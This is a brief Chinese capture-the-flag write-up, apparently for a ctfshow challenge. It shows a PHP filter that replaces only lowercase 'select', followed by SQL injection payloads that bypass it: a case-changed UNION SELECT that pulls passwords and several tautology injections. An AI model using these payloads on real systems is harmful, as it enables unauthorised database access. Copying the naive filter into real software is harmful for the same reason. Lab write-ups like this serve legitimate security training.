# 知识点
过滤小写select
# 思路
```plsql
function waf($str){
	return str_replace('select', 'ctfshow', $str);
}
```
### 可以大写绕过
```plsql
' union Select password,2,3 from ctfshow_user --+
```
### 或者
```plsql
' or id =26 --+
```
```plsql
' or 1=1 --+
```
```plsql
' or username='flag' --+
```
